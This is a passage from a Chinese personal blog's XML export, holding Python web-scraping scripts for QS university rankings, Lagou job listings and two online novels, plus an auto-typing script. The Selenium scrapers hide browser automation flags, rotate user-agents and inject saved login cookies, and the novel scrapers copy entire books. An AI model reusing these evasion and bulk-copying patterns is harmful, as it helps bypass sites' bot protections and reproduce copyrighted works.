class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化 user-agent 对象    得到随机user-agent</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://www.topuniversities.com/university-rankings/world-university-rankings/2022&quot;</span></span><br><span class="line">    <span class="comment"># 不用vpn将如下跳转中文网  网页排版略有不同</span></span><br><span class="line">    <span class="comment"># url = &quot;https://www.qschina.cn/university-rankings/world-university-rankings/2022&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用随机ua</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;user-agent&quot;</span>: ua.random&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除浏览器被控  字样</span></span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 浏览器扩展程序</span></span><br><span class="line">    <span class="comment"># cookie获取程序</span></span><br><span class="line">    <span class="comment"># extension_path1 = &#x27;./2.1.0.0_0.crx&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># xpath程序</span></span><br><span class="line">    extension_path2 = <span class="string">&#x27;./2.0.2_0.crx&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加扩展程序到浏览器</span></span><br><span class="line">    <span class="comment"># options.add_extension(extension_path1)</span></span><br><span class="line">    options.add_extension(extension_path2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加随机ua到浏览器</span></span><br><span class="line">    options.add_argument(<span class="string">&#x27;user-agent=&#x27;</span> + ua.random)</span><br><span class="line">    driver = webdriver.Chrome(options=options)  <span class="comment"># driver = webdriver.Chrome(executable_path=r&#x27;D:PATHchromedriver.exe&#x27;)?</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 浏览器窗口最大化</span></span><br><span class="line">    driver.maximize_window()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始执行函数</span></span><br><span class="line">    get(driver, url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

































]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>半自动输入代码</title>
    <url>//%E5%8D%8A%E8%87%AA%E5%8A%A8%E8%BE%93%E5%85%A5%E4%BB%A3%E7%A0%81</url>
    <content><![CDATA[<h1 id="半自动输入代码"><a href="#半自动输入代码" class="headerlink" title="半自动输入代码"></a>半自动输入代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pyperclip</span><br><span class="line"><span class="keyword">import</span> win32api</span><br><span class="line"><span class="keyword">import</span> win32gui</span><br><span class="line"><span class="keyword">from</span> win32con <span class="keyword">import</span> WM_INPUTLANGCHANGEREQUEST</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换中英文输入法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_language</span>(<span class="params">language=<span class="string">&quot;EN&quot;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    切换语言</span></span><br><span class="line"><span class="string">    :param language: EN––English; ZH––Chinese</span></span><br><span class="line"><span class="string">    :return: bool</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    LANGUAGE = &#123;</span><br><span class="line">        <span class="string">&quot;ZH&quot;</span>: <span class="number">0x0804</span>,</span><br><span class="line">        <span class="string">&quot;EN&quot;</span>: <span class="number">0x0409</span></span><br><span class="line">    &#125;</span><br><span class="line">    hwnd = win32gui.GetForegroundWindow()</span><br><span class="line">    language = LANGUAGE[language]</span><br><span class="line">    result = win32api.SendMessage(</span><br><span class="line">        hwnd,</span><br><span class="line">        WM_INPUTLANGCHANGEREQUEST,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        language</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断字符串是否包含中文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_Chinese</span>(<span class="params">word</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> word:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\u4e00&#x27;</span> &lt;= ch &lt;= <span class="string">&#x27;\u9fff&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)  <span class="comment"># 延迟5秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 文件路径</span></span><br><span class="line">    <span class="comment"># file_path = &#x27;./xin/index.html&#x27;</span></span><br><span class="line">    file_path = <span class="string">r&#x27;E:\Desktop\auto_send.py&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化pyautogui</span></span><br><span class="line">    au = pyautogui</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化pyperclip</span></span><br><span class="line">    pe = pyperclip</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> fp:</span><br><span class="line">        <span class="comment"># 读取所有内容  得到以行为单位的一个list</span></span><br><span class="line">        content = fp.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历list内容</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">            <span class="comment"># 控制台输出查看</span></span><br><span class="line">            <span class="comment"># 判断内容是否包含中文</span></span><br><span class="line">            <span class="keyword">if</span> is_Chinese(i):</span><br><span class="line">                change_language()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># print(&#x27;有中文！！！！&#x27;, i)</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 复制每一行</span></span><br><span class="line">                pe.copy(i)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 查看复制的内容</span></span><br><span class="line">                <span class="comment"># print(r&quot;&#x27;ctrl&#x27;,&#x27;v&#x27; 内容：&quot;,pe.paste())</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">## pyautogui.typewrite() 写入方式    写入不了中文</span></span><br><span class="line">                <span class="comment"># pyautogui.typewrite(pe.paste(),&#x27;0.01&#x27;)</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 采用键盘组合键 粘贴复制的内容</span></span><br><span class="line">                au.hotkey(<span class="string">&#x27;ctrl&#x27;</span>,<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(&#x27;无无无无无无无无无无无无&#x27;,i)</span></span><br><span class="line">                change_language()</span><br><span class="line"></span><br><span class="line">                au.typewrite(i,<span class="string">&#x27;0.01&#x27;</span>)</span><br><span class="line">    change_language(<span class="string">&#x27;ZH&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

































]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>拉勾网职位爬取</title>
    <url>//%E6%8B%89%E5%8B%BE%E7%BD%91%E8%81%8C%E4%BD%8D%E7%88%AC%E5%8F%96</url>
    <content><![CDATA[<h1 id="拉勾网职位爬取"><a href="#拉勾网职位爬取" class="headerlink" title="拉勾网职位爬取"></a>拉勾网职位爬取</h1><p><a href="http://files.demo443.com/Markdown_file/%E6%8B%89%E5%8B%BE%E7%BD%91%E8%81%8C%E4%BD%8D%E7%88%AC%E5%8F%96.rar" target="_blank">file_rar</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment">#登录</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="comment">#登录访问url</span></span><br><span class="line">    driver.get(<span class="string">&#x27;https://www.lagou.com/&#x27;</span>)</span><br><span class="line">    <span class="comment"># 首先清除由于浏览器打开已有的cookies</span></span><br><span class="line">    driver.delete_all_cookies()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;cookies.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> cookief:</span><br><span class="line">        <span class="comment"># 使用json读取cookies 注意读取的是文件 所以用load而不是loads</span></span><br><span class="line">        cookieslist = json.load(cookief)</span><br><span class="line">        <span class="comment"># print(cookieslist)</span></span><br><span class="line">        <span class="keyword">for</span> cookie <span class="keyword">in</span> cookieslist:</span><br><span class="line">            <span class="comment"># print(cookie)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;sameSite&#x27;</span> <span class="keyword">in</span> cookie:</span><br><span class="line">                <span class="keyword">del</span> cookie[<span class="string">&#x27;sameSite&#x27;</span>]</span><br><span class="line">            driver.add_cookie(cookie)</span><br><span class="line">    driver.refresh()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_product</span>(<span class="params">keyword</span>):</span></span><br><span class="line">    <span class="comment"># 设置窗口最大化</span></span><br><span class="line">    driver.maximize_window()</span><br><span class="line">    driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">    <span class="comment"># time.sleep(random.randint(3, 5))</span></span><br><span class="line"></span><br><span class="line">    driver.execute_script(<span class="string">&quot;window.scrollTo(0,document.body.scrollHeight)&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    driver.execute_script(<span class="string">&quot;window.scrollTo(document.body.scrollHeight,0)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;password_remind&quot;]/div[4]&#x27;</span>).click()</span><br><span class="line">    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;lg_tbar&quot;]/div[1]/div[2]/ul/li[2]/div/i&#x27;</span>).click()</span><br><span class="line">    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;search_input&quot;]&#x27;</span>).send_keys(keyword)</span><br><span class="line">    driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;search_button&quot;]&#x27;</span>).click()</span><br><span class="line">    driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    weiye = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[3]/ul/li[8]/a&#x27;</span>).text</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;该职位  一共： &#x27;</span>,weiye,<span class="string">&quot; 页！！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./&#123;&#125;职位详情.csv&#x27;</span>.<span class="built_in">format</span>(keyword),<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> fp:</span><br><span class="line">        fieldnames = [<span class="string">&quot;职位名称&quot;</span>, <span class="string">&quot;发布时间&quot;</span>, <span class="string">&quot;薪资待遇&quot;</span>, <span class="string">&quot;学历要求&quot;</span>, <span class="string">&quot;公司名称&quot;</span>, <span class="string">&quot;公司现状&quot;</span>]</span><br><span class="line">        f_csv = csv.DictWriter(fp, fieldnames=fieldnames)</span><br><span class="line">        f_csv.writeheader()</span><br><span class="line">        <span class="comment">#模拟点击下一页</span></span><br><span class="line">        a = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(weiye)):</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 点击下一页</span></span><br><span class="line">            driver.find_element_by_link_text(<span class="string">&#x27;下一页&#x27;</span>).click()</span><br><span class="line">            driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">            <span class="comment"># 等待</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            <span class="comment"># 拉动滚动条</span></span><br><span class="line">            driver.execute_script(<span class="string">&quot;window.scrollTo(0,document.body.scrollHeight)&quot;</span>) <span class="comment"># 下拉滚动条</span></span><br><span class="line">            <span class="comment"># 获取数据</span></span><br><span class="line">            get_data(a,f_csv)</span><br><span class="line">            <span class="comment"># 随机等待</span></span><br><span class="line">            <span class="comment"># time.sleep(random.randint(3, 5))</span></span><br><span class="line">            driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">b,f_csv</span>):</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># xpath 提取数据</span></span><br><span class="line">    text = driver.page_source</span><br><span class="line">    content = etree.HTML(text)</span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    <span class="comment"># 职位</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 职位名称：</span></span><br><span class="line">        zhiwei = content.xpath(<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[1]/div[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]/div[1]/div[1]/div[1]/a/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 发布时间：</span></span><br><span class="line">        fabushijian = content.xpath(<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[1]/div[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]/div[1]/div[1]/div[1]/span/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 薪资待遇：</span></span><br><span class="line">        xinzidaiyu = content.xpath(<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[1]/div[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]/div[1]/div[1]/div[2]/span/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 学历要求：</span></span><br><span class="line">        xueliyaoqiu = content.xpath(<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[1]/div[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]/div[1]/div[1]/div[2]/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 公司名称：</span></span><br><span class="line">        gongsi = content.xpath(<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[1]/div[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]/div[1]/div[2]/div[1]/a/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># 公司现状:</span></span><br><span class="line">        gognsixianzhuang = content.xpath(<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[1]/div[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]/div[1]/div[2]/div[2]/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*&#x27;</span>*<span class="number">10</span>,<span class="string">&#x27;第 &#123;&#125; 页，第 &#123;&#125; 个职位详情！！！&#x27;</span>.<span class="built_in">format</span>(b,i),<span class="string">&#x27;*&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;职位名称：&#x27;</span>,zhiwei)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;发布时间：&#x27;</span>, fabushijian)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;薪资待遇：&#x27;</span>, xinzidaiyu)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;学历要求：&#x27;</span>, xueliyaoqiu)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;公司名称：&#x27;</span>, gongsi)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;公司现状:&#x27;</span>, gognsixianzhuang)</span><br><span class="line">        f_csv.writerow(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;职位名称&#x27;</span>: zhiwei,</span><br><span class="line">                <span class="string">&#x27;发布时间&#x27;</span>: fabushijian,</span><br><span class="line">                <span class="string">&#x27;薪资待遇&#x27;</span>: xinzidaiyu,</span><br><span class="line">                <span class="string">&#x27;学历要求&#x27;</span>: xueliyaoqiu,</span><br><span class="line">                <span class="string">&#x27;公司名称&#x27;</span>: gongsi,</span><br><span class="line">                <span class="string">&#x27;公司现状&#x27;</span>: gognsixianzhuang</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    keyword = <span class="built_in">input</span>(<span class="string">&#x27;请输入你要爬取的岗位名称:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化 user-agent 对象    得到随机user-agent</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用随机ua</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;user-agent&quot;</span>: ua.random&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除浏览器被控  字样</span></span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_experimental_option(<span class="string">&quot;excludeSwitches&quot;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">    options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 浏览器扩展程序</span></span><br><span class="line">    <span class="comment"># cookie获取程序</span></span><br><span class="line">    <span class="comment"># extension_path1 = &#x27;./2.1.0.0_0.crx&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># xpath程序</span></span><br><span class="line">    extension_path2 = <span class="string">&#x27;./2.0.2_0.crx&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加扩展程序到浏览器</span></span><br><span class="line">    <span class="comment"># options.add_extension(extension_path1)</span></span><br><span class="line">    options.add_extension(extension_path2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加随机ua到浏览器</span></span><br><span class="line">    options.add_argument(<span class="string">&#x27;user-agent=&#x27;</span> + ua.random)</span><br><span class="line">    driver = webdriver.Chrome(options=options)  <span class="comment"># driver = webdriver.Chrome(executable_path=r&#x27;D:PATHchromedriver.exe&#x27;)?</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 浏览器窗口最大化</span></span><br><span class="line">    <span class="comment"># driver.maximize_window()</span></span><br><span class="line"></span><br><span class="line">    login()</span><br><span class="line">    search_product(keyword)</span><br></pre></td></tr></table></figure>

































]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>爬小说_BeautifulSoup解析_easy</title>
    <url>//%E7%88%AC%E5%B0%8F%E8%AF%B4_BeautifulSoup%E8%A7%A3%E6%9E%90_easy</url>
    <content><![CDATA[<h1 id="小说-五术传人-txt"><a href="#小说-五术传人-txt" class="headerlink" title="小说_五术传人.txt"></a>小说_五术传人.txt</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 小说_五术传人.txt    针对  脚本  test  demo  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;https://www.yeshuyuan.com/read/53887/17033995.html&#x27;</span></span><br><span class="line">    req = requests.get(url)</span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    html = req.text</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./五术传人.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="comment"># 全本710章 </span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">712</span>):</span><br><span class="line">            <span class="comment"># 找到标题对应标签节点</span></span><br><span class="line">            table = soup.find(<span class="string">&quot;li&quot;</span>, class_=<span class="string">&quot;active&quot;</span>)</span><br><span class="line">            <span class="comment"># 获取节点内容-标题</span></span><br><span class="line">            name = table.text</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="comment"># 找到内容对应标签节点and获取内容</span></span><br><span class="line">            content = soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&quot;readcontent&quot;</span>).text</span><br><span class="line">            <span class="built_in">print</span>(content)</span><br><span class="line">            <span class="comment"># 写入到txt</span></span><br><span class="line">            fp.write(<span class="string">&#x27;\n&#x27;</span>+name+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            fp.write(content+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;已写入: &#x27;</span>, name)</span><br><span class="line">            urls = soup.find(<span class="string">&#x27;a&#x27;</span>, <span class="built_in">id</span>=<span class="string">&quot;linkNext&quot;</span>).get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">            req = requests.get(urls)</span><br><span class="line">            req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">            html = req.text</span><br><span class="line">            soup = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_html()</span><br><span class="line"></span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>嗯哼</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title>笔下文学_爬小说</title>
    <url>//%E7%AC%94%E4%B8%8B%E6%96%87%E5%AD%A6_%E7%88%AC%E5%B0%8F%E8%AF%B4</url>
    <content><![CDATA[<h1 id="笔下文学-爬小说"><a href="#笔下文学-爬小说" class="headerlink" title="笔下文学_爬小说"></a>笔下文学_爬小说</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 《震惊！我修仙秘密被孙女直播曝光》    针对  脚本  test  demo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    针对 《震惊！我修仙秘密被孙女直播曝光》小说脚本</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 小说网页地址</span></span><br><span class="line">    url = <span class="string">&#x27;http://www.ywggzy.com/bxwx/28463/4083918.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始请求</span></span><br><span class="line">    req = requests.get(url)</span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="comment"># 拿到网页内容</span></span><br><span class="line">    html = req.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用BeautifulSoup解析网页</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入txt文本</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./老敖小说.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="comment"># 连载562章</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">                <span class="comment"># 查找小说主体内容</span></span><br><span class="line">                content = soup.find(<span class="string">&#x27;div&#x27;</span>, <span class="built_in">id</span>=<span class="string">&quot;content&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 章节查看</span></span><br><span class="line">                name = soup.find(<span class="string">&#x27;h1&#x27;</span>, class_=<span class="string">&quot;title&quot;</span>).text</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 拿到主体内容 转型成字符串  清洗内容</span></span><br><span class="line">                ct = <span class="built_in">str</span>(content).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;&lt;br/&gt;　　&lt;br/&gt;　　&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>).replace(</span><br><span class="line">                    <span class="string">&#x27;&lt;div class=&quot;posterror&quot;&gt;&lt;a class=&quot;red&quot; href=&quot;javascript:postError();&quot;&gt;章节错误,点此举报(免注册)&lt;/a&gt;,&#x27;</span></span><br><span class="line">                    <span class="string">&#x27;举报后维护人员会在两分钟内校正章节内容,请耐心等待,并刷新页面。&lt;/div&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;&lt;div class=&quot;content&quot; &#x27;</span></span><br><span class="line">                                                                                               <span class="string">&#x27;id=&quot;content&quot;&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(</span><br><span class="line">                    <span class="string">&#x27;&lt;/div&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;                        &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;　　　　&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;(本章完)&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输出清洗好的内容到控制台</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;ct=========&#x27;</span>, ct)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n章节：&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 写入输出的内容</span></span><br><span class="line">                fp.write(ct)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 用xpath解析网页  获取下一页url</span></span><br><span class="line">                con = etree.HTML(html)</span><br><span class="line">                urls = con.xpath(<span class="string">&#x27;//*[@id=&quot;container&quot;]/div/div/div[2]/div[4]/a[3]/@href&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                ping = <span class="string">&#x27;http://www.ywggzy.com/bxwx/28463/&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 下一页url拼接</span></span><br><span class="line">                urll = ping + urls</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 输出url测试</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;222222222222&#x27;</span>, urll)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 继续请求下一页</span></span><br><span class="line">                req = requests.get(urll)</span><br><span class="line">                req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">                html = req.text</span><br><span class="line">                soup = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 因为上面翻页无具体规则   所以循环次数填得略多  爬取完成后会继续循环 导致出错  在此抛出异常</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;已爬取完毕！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 